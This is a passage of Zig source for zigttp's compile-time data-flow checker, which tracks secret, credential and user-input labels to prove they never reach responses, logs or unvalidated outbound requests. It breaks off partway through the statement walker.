//! Compile-Time Data Flow Provenance Checker
//!
//! Tracks where data comes from (sources with labels) and where it goes
//! (sinks with policies), proving security properties at compile time:
//!   - Secrets (env vars with sensitive names) never reach response bodies
//!   - Credentials (auth tokens, JWTs) never appear in logs
//!   - User input is validated before use in external egress
//!
//! This is possible because zigttp's JS subset has no eval, no exceptions,
//! no dynamic property access beyond known patterns, and virtual modules are
//! the ONLY I/O boundary. The IR tree IS the control flow graph. Data flow
//! analysis is a simple recursive tree walk, not an expensive fixpoint.
//!
//! Labels are auto-derived from ModuleBinding.return_labels and refined by
//! env var naming conventions. No user annotations required for basic proofs.

const std = @import("std");
const ir = @import("parser/ir.zig");
const object = @import("object.zig");
const context = @import("context.zig");
const builtin_modules = @import("builtin_modules.zig");
const mb = @import("module_binding.zig");
const bool_checker_mod = @import("bool_checker.zig");
const counterexample = @import("counterexample.zig");
const repair_intent_mod = @import("repair_intent.zig");

pub const RepairIntent = repair_intent_mod.RepairIntent;

const Node = ir.Node;
const NodeIndex = ir.NodeIndex;
const NodeTag = ir.NodeTag;
const IrView = ir.IrView;
const null_node = ir.null_node;
const LabelSet = mb.LabelSet;
const DataLabel = mb.DataLabel;

const packBindingKey = bool_checker_mod.packBindingKey;
const getSourceLine = bool_checker_mod.getSourceLine;

// ---------------------------------------------------------------------------
// Diagnostic types
// ---------------------------------------------------------------------------

pub const Severity = enum {
    err,
    warning,

    pub fn label(self: Severity) []const u8 {
        return switch (self) {
            .err => "error",
            .warning => "warning",
        };
    }
};

pub const DiagnosticKind = enum {
    secret_in_response, // {secret} data in Response body/headers
    credential_in_response, // {credential} data in Response body
    secret_in_log, // {secret} data in console.log/warn/error
    credential_in_log, // {credential} data in console.log/warn/error
    secret_in_egress_url, // {secret} data in fetchSync URL
    credential_in_egress_url, // {credential} data in fetchSync URL
    secret_in_egress_body, // {secret} data in fetchSync body
    unvalidated_input_in_egress, // {user_input} without {validated} in fetchSync
};

/// Snapshot of the branch constraints and module calls observed on the
/// path that witnessed a flow sink. Present on diagnostics whose kind
/// maps to a `counterexample.PropertyTag`; the solver turns it into an
/// executable request + stub sequence. Owned by the FlowChecker
/// allocator; freed in `FlowChecker.deinit`.
pub const Witness = struct {
    path_constraints: []const counterexample.WitnessConstraint,
    io_calls: []const counterexample.TrackedIoCall,
};

pub const Diagnostic = struct {
    severity: Severity,
    kind: DiagnosticKind,
    node: NodeIndex,
    message: []const u8,
    help: ?[]const u8,
    witness: ?Witness = null,
    /// Typed repair primitive the agent uses to pick an apply step directly.
    /// All flow-checker diagnostics map to
    /// the same `insert_guard_before_line` shape today — the agent inserts
    /// a redact/mask/validate call ahead of the offending sink.
    repair_intent: ?RepairIntent = null,
};

/// How a flow property was *held* (proven safe), captured for the green-proof
/// card. The passing-case sibling of `Witness`: where `Witness` records the
/// path that breaks a property, a `DefendedPath` records why the property
/// could not be broken. Two shapes:
///   - `.validated`: a tainted value reached a sink but carried `.validated`,
///     i.e. it passed a named validator first. `guard_func` is the validator.
///   - `.never_reached`: a tainted value was read but reached no sink at all.
///     No guard is named (none exists); the value is simply contained.
///
/// Soundness: a `.validated` path is emitted ONLY when the specific validator
/// binding is recovered from the sink expression's `result.value` provenance.
/// If the guard cannot be named, no path is recorded - the property still
/// proves true, it just carries no resisted card. The evidence is always
/// derived from what the prover observed, never fabricated.
pub const SafeForm = enum { validated, never_reached };

pub const DefendedPath = struct {
    property: counterexample.PropertyTag,
    safe_form: SafeForm,
    /// Validator function name, present iff `safe_form == .validated`.
    /// Borrowed from `module_fn_meta` (checker-lifetime); never freed here.
    guard_func: ?[]const u8 = null,
    guard_line: u32 = 0,
    /// Human label of the sink the validated value safely reached
    /// (static literal); "" for `.never_reached`.
    sink_label: []const u8 = "",
    sink_line: u32 = 0,
};

/// The validator call that produced a `.validated` binding, recorded so a
/// defended path can name the guard. `node` resolves to the call's source loc.
const GuardInfo = struct {
    func: []const u8,
    node: NodeIndex,
};

/// Map a diagnostic kind to the property tag it witnesses. `null` when the
/// diagnostic does not correspond to a currently modelled property (the
/// counterexample surface is a subset of flow diagnostics by design).
pub fn propertyTagForKind(kind: DiagnosticKind) ?counterexample.PropertyTag {
    return switch (kind) {
        .secret_in_response,
        .secret_in_log,
        .secret_in_egress_url,
        .secret_in_egress_body,
        => .no_secret_leakage,
        .credential_in_response,
        .credential_in_log,
        .credential_in_egress_url,
        => .no_credential_leakage,
        .unvalidated_input_in_egress => .injection_safe,
    };
}

/// Proven data flow properties for a handler.
pub const FlowProperties = struct {
    /// No {secret} data reaches response bodies, headers, or external egress.
    no_secret_leakage: bool = true,
    /// No {credential} data reaches response bodies or logs.
    no_credential_leakage: bool = true,
    /// All {user_input} data passes through validation before external egress.
    input_validated: bool = true,
    /// {user_input} data does not flow to external egress hosts.
    pii_contained: bool = true,
    /// No unvalidated user input reaches sensitive sinks (egress, HTML responses).
    injection_safe: bool = true,
};

// ---------------------------------------------------------------------------
// External data labels
// ---------------------------------------------------------------------------

/// An externally declared label binding: a field name, its classification,
/// and a human-readable reason shown in diagnostics.
pub const ExternalLabel = struct {
    field: []const u8, // e.g. "User.email" or just "email"
    label: DataLabel,
    reason: []const u8,
};

/// Map a JSON label string to the corresponding DataLabel enum value.
/// Returns null for unrecognized strings.
pub fn parseDataLabel(s: []const u8) ?DataLabel {
    const map = .{
        .{ "secret", DataLabel.secret },
        .{ "credential", DataLabel.credential },
        .{ "user_input", DataLabel.user_input },
        .{ "config", DataLabel.config },
        .{ "internal", DataLabel.internal },
        .{ "external", DataLabel.external },
        .{ "validated", DataLabel.validated },
    };
    inline for (map) |entry| {
        if (std.mem.eql(u8, s, entry[0])) return entry[1];
    }
    return null;
}

/// Parse external label declarations from JSON bytes.
/// Expected format: { "labels": [ { "field": "...", "label": "...", "reason": "..." }, ... ] }
/// Returns owned slice; caller must free with the same allocator.
pub fn parseExternalLabels(allocator: std.mem.Allocator, json_bytes: []const u8) ![]const ExternalLabel {
    var parsed = try std.json.parseFromSlice(std.json.Value, allocator, json_bytes, .{});
    defer parsed.deinit();

    if (parsed.value != .object) return error.InvalidExternalLabels;
    const root = parsed.value.object;
    const labels_val = root.get("labels") orelse return error.InvalidExternalLabels;
    if (labels_val != .array) return error.InvalidExternalLabels;

    const items = labels_val.array.items;
    var result = try allocator.alloc(ExternalLabel, items.len);
    var count: usize = 0;
    errdefer {
        for (result[0..count]) |entry| {
            allocator.free(entry.field);
            allocator.free(entry.reason);
        }
        allocator.free(result);
    }

    for (items) |item| {
        if (item != .object) continue;
        const obj = item.object;

        const field_val = obj.get("field") orelse continue;
        const label_val = obj.get("label") orelse continue;
        const reason_val = obj.get("reason") orelse continue;

        if (field_val != .string or label_val != .string or reason_val != .string) continue;

        const data_label = parseDataLabel(label_val.string) orelse continue;

        // Dupe strings so they outlive the parsed JSON tree
        const field_dupe = try allocator.dupe(u8, field_val.string);
        errdefer allocator.free(field_dupe);
        const reason_dupe = try allocator.dupe(u8, reason_val.string);

        result[count] = .{
            .field = field_dupe,
            .label = data_label,
            .reason = reason_dupe,
        };
        count += 1;
    }

    // Shrink to actual count
    if (count < result.len) {
        result = try allocator.realloc(result, count);
    }
    return result;
}

// ---------------------------------------------------------------------------
// FlowChecker
// ---------------------------------------------------------------------------

/// Caps for callee return-label summaries and return-value resolution. Beyond
/// these the checker falls back to the conservative direction (labels kept,
/// label-only sink check) rather than dropping taint.
const max_summary_params = 8;
const max_summary_depth = 4;
const response_resolve_limit = 16;

pub const FlowChecker = struct {
    allocator: std.mem.Allocator,
    ir_view: IrView,
    atoms: ?*context.AtomTable,
    diagnostics: std.ArrayList(Diagnostic),

    /// Per-binding labels: packed(scope_id, slot) -> LabelSet.
    binding_labels: std.AutoHashMapUnmanaged(u32, LabelSet),
    /// Virtual module import tracking: local slot -> FunctionBinding return_labels.
    module_fn_labels: std.AutoHashMapUnmanaged(u16, LabelSet),
    /// Virtual module function metadata (module name, function name, return kind),
    /// keyed by the same slot as `module_fn_labels`. Populated by `scanImports`
    /// and consumed by the counterexample-witness capture pipeline.
    module_fn_meta: std.AutoHashMapUnmanaged(u16, counterexample.StubInfo),
    /// Per-binding origin: packed(scope_id, slot) -> metadata for the module
    /// call that initialised this binding. Lets the constraint extractor emit
    /// per-call stub constraints on `if (binding)` patterns.
    binding_origin: std.AutoHashMapUnmanaged(u32, counterexample.StubInfo),
    /// Result binding tracking: packed(scope_id, slot) -> return_labels from the producing call.
    /// When accessing .value on these bindings, the return_labels are merged in.
    result_binding_labels: std.AutoHashMapUnmanaged(u32, LabelSet),
    /// Defining value nodes per binding: packed(scope_id, slot) -> every init
    /// and assignment value recorded during the walk. Lets the response-sink
    /// check resolve a returned identifier back to the Response call(s) that
    /// produced it; without this, `const r = Response.html(x); return r;`
    /// skips the sink analysis entirely.
    binding_value_nodes: std.AutoHashMapUnmanaged(u32, std.ArrayListUnmanaged(NodeIndex)),
    /// User function declarations: packed binding key -> function expression
    /// node. Feeds callee return-label summaries in `userCallLabels`.
    user_fn_decls: std.AutoHashMapUnmanaged(u32, NodeIndex),
    /// When non-null, the walk is summarizing a callee body: return statements
    /// merge their labels here instead of running sink checks, and expression
    /// sinks stay silent (diagnostics belong to the handler walk).
    summary_returns: ?*LabelSet,
    /// Callee summaries in progress (recursion guard).
    summary_stack: [max_summary_depth]u32,
    summary_depth: u8,
    /// Guard provenance for validated bindings: packed(scope_id, slot) -> the
    /// validator call that set the `.validated` label. Lets a defended path
    /// name the guard ("validated by schemaCompile()"). Populated alongside
    /// `result_binding_labels` in `trackResultBinding`.
    result_binding_guard: std.AutoHashMapUnmanaged(u32, GuardInfo),
    /// Passing-case evidence: why each held flow property could not be broken.
    /// The green-proof sibling of `diagnostics`. Strings are borrowed
    /// (checker-lifetime / static); only the list backing is freed.
    defended_paths: std.ArrayListUnmanaged(DefendedPath),
    /// Handler request parameter binding key (packed scope_id + slot).
    req_binding_key: ?u32,
    /// Slot of the `env` function import (for smart label refinement).
    env_fn_slot: ?u16,
    /// Constraint stack maintained as `walkStmt` descends into conditional
    /// branches. Snapshotted onto every diagnostic at emission time.
    working_constraints: std.ArrayListUnmanaged(counterexample.WitnessConstraint),
    /// Ordered list of virtual-module calls observed by the current walk.
    /// Snapshotted alongside `working_constraints` on diagnostics.
    working_io_calls: std.ArrayListUnmanaged(counterexample.TrackedIoCall),

    /// External label overrides: property name -> LabelSet (additive, merged via OR).
    /// Both qualified ("User.email") and short ("email") forms are registered.
    external_labels: std.StringHashMapUnmanaged(LabelSet),
    /// External label reasons: property name -> human-readable reason for diagnostics.
    external_reasons: std.StringHashMapUnmanaged([]const u8),
    /// Dynamically formatted diagnostic messages that need freeing.
    allocated_messages: std.ArrayListUnmanaged([]const u8),

    properties: FlowProperties,

    pub fn init(allocator: std.mem.Allocator, ir_view: IrView, atoms: ?*context.AtomTable) FlowChecker {
        return .{
            .allocator = allocator,
            .ir_view = ir_view,
            .atoms = atoms,
            .diagnostics = .empty,
            .binding_labels = .empty,
            .module_fn_labels = .empty,
            .module_fn_meta = .empty,
            .binding_origin = .empty,
            .result_binding_labels = .empty,
            .result_binding_guard = .empty,
            .binding_value_nodes = .empty,
            .user_fn_decls = .empty,
            .summary_returns = null,
            .summary_stack = @splat(0),
            .summary_depth = 0,
            .defended_paths = .empty,
            .req_binding_key = null,
            .env_fn_slot = null,
            .working_constraints = .empty,
            .working_io_calls = .empty,
            .external_labels = .empty,
            .external_reasons = .empty,
            .allocated_messages = .empty,
            .properties = .{},
        };
    }

    pub fn deinit(self: *FlowChecker) void {
        for (self.diagnostics.items) |d| {
            if (d.witness) |w| {
                if (w.path_constraints.len > 0) self.allocator.free(w.path_constraints);
                if (w.io_calls.len > 0) self.allocator.free(w.io_calls);
            }
        }
        self.diagnostics.deinit(self.allocator);
        self.binding_labels.deinit(self.allocator);
        self.module_fn_labels.deinit(self.allocator);
        self.module_fn_meta.deinit(self.allocator);
        self.binding_origin.deinit(self.allocator);
        self.working_constraints.deinit(self.allocator);
        self.working_io_calls.deinit(self.allocator);
        self.result_binding_labels.deinit(self.allocator);
        self.result_binding_guard.deinit(self.allocator);
        self.defended_paths.deinit(self.allocator);
        var value_node_iter = self.binding_value_nodes.valueIterator();
        while (value_node_iter.next()) |list| {
            list.deinit(self.allocator);
        }
        self.binding_value_nodes.deinit(self.allocator);
        self.user_fn_decls.deinit(self.allocator);

        // Free dynamically formatted diagnostic messages
        for (self.allocated_messages.items) |msg| {
            self.allocator.free(msg);
        }
        self.allocated_messages.deinit(self.allocator);

        // Free duped key strings and reason strings from external labels
        var label_iter = self.external_labels.iterator();
        while (label_iter.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
        }
        self.external_labels.deinit(self.allocator);

        var reason_iter = self.external_reasons.iterator();
        while (reason_iter.next()) |entry| {
            self.allocator.free(entry.key_ptr.*);
            self.allocator.free(entry.value_ptr.*);
        }
        self.external_reasons.deinit(self.allocator);
    }

    /// Run the flow analysis on the given handler function node.
    /// Returns the number of errors found.
    pub fn check(self: *FlowChecker, handler_func: NodeIndex) !u32 {
        self.scanImports();
        self.scanFunctionDecls();
        self.findHandlerParam(handler_func);
        self.walkStmt(handler_func);
        self.recordContainedSecrets();

        var error_count: u32 = 0;
        for (self.diagnostics.items) |diag| {
            if (diag.severity == .err) error_count += 1;
        }
        return error_count;
    }

    /// After the walk, record `.never_reached` defended paths for the leak
    /// families: a secret/credential binding was read but no sink consumed it.
    /// Only fires when such a binding exists, so handlers that touch no secrets
    /// carry no spurious card. The user_input family is intentionally excluded
    /// here - the request parameter always carries `.user_input`, so a
    /// never-reached scan on it would fire on every handler.
    fn recordContainedSecrets(self: *FlowChecker) void {
        const Pair = struct { tag: counterexample.PropertyTag, label: DataLabel, held: bool };
        const pairs = [_]Pair{
            .{ .tag = .no_secret_leakage, .label = .secret, .held = self.properties.no_secret_leakage },
            .{ .tag = .no_credential_leakage, .label = .credential, .held = self.properties.no_credential_leakage },
        };
        for (pairs) |p| {
            if (!p.held) continue;
            if (self.hasDefendedPath(p.tag)) continue;
            if (!self.anyBindingHasLabel(p.label)) continue;
            self.defended_paths.append(self.allocator, .{
                .property = p.tag,
                .safe_form = .never_reached,
            }) catch {};
        }
    }

    fn anyBindingHasLabel(self: *const FlowChecker, label: DataLabel) bool {
        var it = self.binding_labels.valueIterator();
        while (it.next()) |ls| {
            if (ls.has(label)) return true;
        }
        return false;
    }

    fn hasDefendedPath(self: *const FlowChecker, tag: counterexample.PropertyTag) bool {
        for (self.defended_paths.items) |d| {
            if (d.property == tag) return true;
        }
        return false;
    }

    /// Record a `.validated` defended path for `tag` if its guard can be named
    /// from the sink value's `result.value` provenance. No guard found -> no
    /// path (the property still holds; it just carries no resisted card).
    fn recordValidated(
        self: *FlowChecker,
        tag: counterexample.PropertyTag,
        value_expr: NodeIndex,
        sink_node: NodeIndex,
        sink_label: []const u8,
    ) void {
        if (self.hasDefendedPath(tag)) return;
        const guard = self.findGuardInExpr(value_expr) orelse return;
        const guard_loc = self.ir_view.getLoc(guard.node);
        const sink_loc = self.ir_view.getLoc(sink_node);
        self.defended_paths.append(self.allocator, .{
            .property = tag,
            .safe_form = .validated,
            .guard_func = guard.func,
            .guard_line = if (guard_loc) |l| l.line else 0,
            .sink_label = sink_label,
            .sink_line = if (sink_loc) |l| l.line else 0,
        }) catch {};
    }

    /// Walk an expression for the validator that cleared the taint: the first
    /// `<ident>.value` whose binding is a tracked validation result, or a bare
    /// identifier that is itself such a binding. Mirrors `inferLabels`'
    /// recursion over the shapes that can carry a `.validated` label.
    fn findGuardInExpr(self: *const FlowChecker, node: NodeIndex) ?GuardInfo {
        if (node == null_node) return null;
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .identifier => {
                const binding = self.ir_view.getBinding(node) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                return self.result_binding_guard.get(key);
            },
            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return null;
                // `result.value` is the canonical validated-value access.
                if (self.resolveAtomName(member.property)) |prop_name| {
                    if (std.mem.eql(u8, prop_name, "value")) {
                        const obj_tag = self.ir_view.getTag(member.object) orelse return null;
                        if (obj_tag == .identifier) {
                            const binding = self.ir_view.getBinding(member.object) orelse return null;
                            const key = packBindingKey(binding.scope_id, binding.slot);
                            if (self.result_binding_guard.get(key)) |g| return g;
                        }
                    }
                }
                return self.findGuardInExpr(member.object);
            },
            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return null;
                return self.findGuardInExpr(bin.left) orelse self.findGuardInExpr(bin.right);
            },
            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return null;
                return self.findGuardInExpr(t.then_branch) orelse self.findGuardInExpr(t.else_branch);
            },
            .template_literal => {
                const tmpl = self.ir_view.getTemplate(node) orelse return null;
                for (0..tmpl.parts_count) |i| {
                    const part_idx = self.ir_view.getListIndex(tmpl.parts_start, @intCast(i));
                    const part_tag = self.ir_view.getTag(part_idx) orelse continue;
                    if (part_tag == .template_part_expr) {
                        if (self.ir_view.getOptValue(part_idx)) |expr| {
                            if (self.findGuardInExpr(expr)) |g| return g;
                        }
                    }
                }
                return null;
            },
            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return null;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                    if (prop_tag == .object_property) {
                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                        if (self.findGuardInExpr(prop.value)) |g| return g;
                    } else if (prop_tag == .object_spread) {
                        if (self.ir_view.getOptValue(prop_idx)) |val| {
                            if (self.findGuardInExpr(val)) |g| return g;
                        }
                    }
                }
                return null;
            },
            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return null;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem_idx = self.ir_view.getListIndex(arr.elements_start, i);
                    if (self.findGuardInExpr(elem_idx)) |g| return g;
                }
                return null;
            },
            .spread, .unary_op => {
                if (self.ir_view.getOptValue(node)) |operand| return self.findGuardInExpr(operand);
                return null;
            },
            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return null;
                return self.findGuardInExpr(asgn.value);
            },
            .computed_access => {
                const member = self.ir_view.getMember(node) orelse return null;
                return self.findGuardInExpr(member.object);
            },
            else => return null,
        }
    }

    pub fn getDiagnostics(self: *const FlowChecker) []const Diagnostic {
        return self.diagnostics.items;
    }

    /// Passing-case evidence: defended paths for held flow properties.
    pub fn getDefendedPaths(self: *const FlowChecker) []const DefendedPath {
        return self.defended_paths.items;
    }

    pub fn getProperties(self: *const FlowChecker) FlowProperties {
        return self.properties;
    }

    /// Populate external label maps from parsed ExternalLabel declarations.
    /// For qualified field names like "User.email", both the full name and the
    /// short form ("email") are registered. Labels are additive: if multiple
    /// declarations target the same field, their LabelSets are merged via OR.
    pub fn setExternalLabels(self: *FlowChecker, labels: []const ExternalLabel) void {
        for (labels) |ext| {
            self.registerExternalField(ext.field, ext.label, ext.reason);

            // Also register short form: everything after the last dot
            if (std.mem.lastIndexOfScalar(u8, ext.field, '.')) |dot_pos| {
                const short = ext.field[dot_pos + 1 ..];
                if (short.len > 0) {
                    self.registerExternalField(short, ext.label, ext.reason);
                }
            }
        }
    }

    fn registerExternalField(self: *FlowChecker, name: []const u8, label: DataLabel, reason: []const u8) void {
        const label_set = LabelSet.fromLabel(label);

        if (self.external_labels.getEntry(name)) |entry| {
            // Merge into existing entry - no new key allocation needed
            entry.value_ptr.* = LabelSet.merge(entry.value_ptr.*, label_set);
        } else {
            const duped_key = self.allocator.dupe(u8, name) catch return;
            self.external_labels.put(self.allocator, duped_key, label_set) catch {
                self.allocator.free(duped_key);
                return;
            };
        }

        if (self.external_reasons.get(name) == null) {
            const reason_key = self.allocator.dupe(u8, name) catch return;
            const reason_val = self.allocator.dupe(u8, reason) catch {
                self.allocator.free(reason_key);
                return;
            };
            self.external_reasons.put(self.allocator, reason_key, reason_val) catch {
                self.allocator.free(reason_key);
                self.allocator.free(reason_val);
            };
        }
    }

    pub fn formatDiagnostics(
        self: *const FlowChecker,
        source: []const u8,
        writer: anytype,
    ) !void {
        for (self.diagnostics.items) |diag| {
            const loc = self.ir_view.getLoc(diag.node) orelse continue;
            try writer.print("{s}: {s}\n", .{ diag.severity.label(), diag.message });
            try writer.print("  --> {d}:{d}\n", .{ loc.line, loc.column });
            if (getSourceLine(source, loc.line)) |line| {
                try writer.print("   |\n", .{});
                try writer.print("{d: >3} | {s}\n", .{ loc.line, line });
                try writer.print("   | ", .{});
                var col: u16 = 1;
                while (col < loc.column) : (col += 1) {
                    try writer.writeByte(' ');
                }
                try writer.writeAll("^\n");
            }
            if (diag.help) |help| {
                try writer.print("   = help: {s}\n", .{help});
            }
            try writer.writeByte('\n');
        }
    }

    fn scanImports(self: *FlowChecker) void {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .import_decl) continue;

            const import_decl = self.ir_view.getImportDecl(idx) orelse continue;
            const module_str = self.ir_view.getString(import_decl.module_idx) orelse continue;
            if (builtin_modules.fromSpecifier(module_str) == null) continue;

            var j: u8 = 0;
            while (j < import_decl.specifiers_count) : (j += 1) {
                const spec_idx = self.ir_view.getListIndex(import_decl.specifiers_start, j);
                const spec = self.ir_view.getImportSpec(spec_idx) orelse continue;
                const imported_name = self.resolveAtomName(spec.imported_atom) orelse continue;

                if (builtin_modules.findExport(module_str, imported_name)) |entry| {
                    if (!entry.func.return_labels.isEmpty()) {
                        self.module_fn_labels.put(
                            self.allocator,
                            spec.local_binding.slot,
                            entry.func.return_labels,
                        ) catch {};
                    }
                    self.module_fn_meta.put(
                        self.allocator,
                        spec.local_binding.slot,
                        .{
                            .module = entry.binding.name,
                            .func = entry.func.name,
                            .returns = entry.func.returns,
                        },
                    ) catch {};
                    if (std.mem.eql(u8, imported_name, "env")) {
                        self.env_fn_slot = spec.local_binding.slot;
                    }
                }
            }
        }
    }

    /// Index user function declarations (and function-valued const/let
    /// bindings) so call-label inference can summarize callee bodies instead
    /// of dropping labels at every user-defined call boundary.
    fn scanFunctionDecls(self: *FlowChecker) void {
        const node_count = self.ir_view.nodeCount();
        for (0..node_count) |idx_usize| {
            const idx: NodeIndex = @intCast(idx_usize);
            const tag = self.ir_view.getTag(idx) orelse continue;
            if (tag != .function_decl and tag != .var_decl) continue;

            // function_decl shares the var_decl layout: binding + init
            // function expression.
            const vd = self.ir_view.getVarDecl(idx) orelse continue;
            if (vd.init == null_node or vd.pattern != null_node) continue;
            if (tag == .var_decl) {
                const init_tag = self.ir_view.getTag(vd.init) orelse continue;
                if (init_tag != .function_expr and init_tag != .arrow_function) continue;
            }
            const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
            self.user_fn_decls.put(self.allocator, key, vd.init) catch {};
        }
    }

    fn findHandlerParam(self: *FlowChecker, handler_func: NodeIndex) void {
        const func = self.ir_view.getFunction(handler_func) orelse return;
        if (func.params_count == 0) return;

        // First parameter is the request object. The parser wraps every
        // function parameter in a `.pattern_element`, even for the simple
        // `function handler(req)` case; drill through to the binding.
        const param_idx = self.ir_view.getListIndex(func.params_start, 0);
        const binding = self.paramBinding(param_idx) orelse return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        self.req_binding_key = key;
        // Request parameter carries user_input label
        self.binding_labels.put(self.allocator, key, .{ .user_input = true }) catch {};
    }

    /// Unwrap a function parameter node to its binding slot. Handles both
    /// the bare `.identifier` shape and the `.pattern_element` wrapper
    /// the parser emits for every parameter. Destructuring patterns
    /// (object_pattern / array_pattern) return null; those don't carry a
    /// single binding slot and callers treat the request as unnamed.
    fn paramBinding(self: *const FlowChecker, param_idx: NodeIndex) ?ir.BindingRef {
        return self.ir_view.paramBinding(param_idx);
    }

    /// Conservatively attach `labels` to every binding bound by a destructuring
    /// pattern (object/array, nested patterns, and rest elements). Without this,
    /// taint pulled out via `const { apiKey } = secretProducingCall()` is keyed
    /// only on the dummy whole-declaration binding and the destructured local is
    /// untracked, so the secret leaks unflagged.
    fn applyPatternLabels(self: *FlowChecker, pattern: NodeIndex, labels: LabelSet) void {
        if (pattern == null_node) return;
        const tag = self.ir_view.getTag(pattern) orelse return;
        switch (tag) {
            .object_pattern, .array_pattern => {
                const arr = self.ir_view.getArray(pattern) orelse return;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    self.applyPatternLabels(self.ir_view.getListIndex(arr.elements_start, i), labels);
                }
            },
            .pattern_element, .pattern_rest => {
                const pe = self.ir_view.getPatternElem(pattern) orelse return;
                switch (pe.kind) {
                    .simple, .rest => {
                        const key = packBindingKey(pe.binding.scope_id, pe.binding.slot);
                        self.binding_labels.put(self.allocator, key, labels) catch {};
                    },
                    // Nested pattern: recurse into pe.key.
                    .object, .array => self.applyPatternLabels(pe.key, labels),
                }
            },
            .identifier => {
                const binding = self.ir_view.getBinding(pattern) orelse return;
                const key = packBindingKey(binding.scope_id, binding.slot);
                self.binding_labels.put(self.allocator, key, labels) catch {};
            },
            else => {},
        }
    }

    /// Walk a (possibly nested) member-access assignment target down to its root
    /// identifier binding, so `obj.field = secret` / `obj.a.b = secret` taints
    /// the base object rather than dropping the label entirely.
    fn assignmentRootBinding(self: *const FlowChecker, target: NodeIndex) ?ir.BindingRef {
        var node = target;
        while (true) {
            const tag = self.ir_view.getTag(node) orelse return null;
            switch (tag) {
                .identifier => return self.ir_view.getBinding(node),
                .member_access, .optional_chain => {
                    const member = self.ir_view.getMember(node) orelse return null;
                    node = member.object;
                },
                else => return null,
            }
        }
    }

    /// Record a defining value node for a binding so the response-sink check
    /// can resolve returned identifiers. Every value is kept (not just the
    /// last) so a tainted branch assignment is still found when a later
    /// branch overwrites the labels.
    fn recordBindingValue(self: *FlowChecker, binding: ir.BindingRef, value: NodeIndex) void {
        if (value == null_node) return;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const gop = self.binding_value_nodes.getOrPut(self.allocator, key) catch return;
        if (!gop.found_existing) gop.value_ptr.* = .empty;
        gop.value_ptr.append(self.allocator, value) catch {};
    }

    fn walkStmt(self: *FlowChecker, node: NodeIndex) void {
        if (node == null_node) return;
        const tag = self.ir_view.getTag(node) orelse return;

        switch (tag) {
            .program, .block => {
                const block = self.ir_view.getBlock(node) orelse return;
                for (0..block.stmts_count) |i| {
                    const stmt_idx = self.ir_view.getListIndex(block.stmts_start, @intCast(i));
                    self.walkStmt(stmt_idx);
                }
            },

            .if_stmt => {
                const if_s = self.ir_view.getIfStmt(node) orelse return;

                // Both `working_constraints` and `working_io_calls` are
                // path-scoped: entering a branch extends them, leaving
                // restores them. Without the io_calls restore, calls made
                // in a sibling branch would appear in the witness for this
                // one, so the synthesised stub sequence would no longer
                // drive the handler down the path that actually witnesses
                // the sink.
                const saved_io = self.working_io_calls.items.len;
                const then_pushed = self.pushConditionConstraints(if_s.condition, false);
                self.walkStmt(if_s.then_branch);
                self.popConstraints(then_pushed);
                self.working_io_calls.shrinkRetainingCapacity(saved_io);

                if (if_s.else_branch != null_node) {
                    const else_pushed = self.pushConditionConstraints(if_s.condition, true);
                    self.walkStmt(if_s.else_branch);
                    self.popConstraints(else_pushed);
                    self.working_io_calls.shrinkRetainingCapacity(saved_io);
                }
            },

            .var_decl => {
                const vd = self.ir_view.getVarDecl(node) orelse return;
                if (vd.init != null_node) {
                    const labels = self.inferLabels(vd.init);
                    if (!labels.isEmpty()) {
                        if (vd.pattern != null_node) {
                            // Destructuring declaration: propagate RHS labels to
                            // every bound local conservatively.
                            self.applyPatternLabels(vd.pattern, labels);
                        } else {
                            const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
                            self.binding_labels.put(self.allocator, key, labels) catch {};
                        }
                    }
                    if (vd.pattern == null_node) {
                        self.recordBindingValue(vd.binding, vd.init);
                    }
                    self.trackModuleCallInit(vd);
                    // Track result bindings from validation calls for .value label narrowing
                    self.trackResultBinding(vd);
                }
            },

            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return;
                const labels = self.inferLabels(asgn.value);
                // Track label updates for simple identifier assignments
                const target_tag = self.ir_view.getTag(asgn.target) orelse return;
                if (target_tag == .identifier) {
                    const binding = self.ir_view.getBinding(asgn.target) orelse return;
                    const key = packBindingKey(binding.scope_id, binding.slot);
                    if (asgn.op) |_| {
                        // Compound assignment (+=, etc): merge with existing
                        const existing = self.binding_labels.get(key) orelse LabelSet.empty;
                        self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, labels)) catch {};
                    } else {
                        // Simple assignment: replace
                        self.binding_labels.put(self.allocator, key, labels) catch {};
                    }
                    self.recordBindingValue(binding, asgn.value);
                } else if (target_tag == .member_access or target_tag == .optional_chain or target_tag == .computed_access) {
                    // `obj.field = secret` / `obj[k] = secret`: taint the base
                    // object so a later read of `obj` keeps the label. Merge
                    // rather than replace, since other fields may already taint it.
                    if (!labels.isEmpty()) {
                        if (self.assignmentRootBinding(asgn.target)) |binding| {
                            const key = packBindingKey(binding.scope_id, binding.slot);
                            const existing = self.binding_labels.get(key) orelse LabelSet.empty;
                            self.binding_labels.put(self.allocator, key, LabelSet.merge(existing, labels)) catch {};
                        }
                    }
                }
            },

            .return_stmt => {
                if (self.ir_view.getOptValue(node)) |ret_val| {
                    if (self.summary_returns) |acc| {
                        acc.* = LabelSet.merge(acc.*, self.inferLabels(ret_val));
                    } else {
                        // Check if returning data via Response helpers
                        self.checkResponseSink(ret_val);
                    }
                }
            },

            .expr_stmt => {
                if (self.ir_view.getOptValue(node)) |expr| {
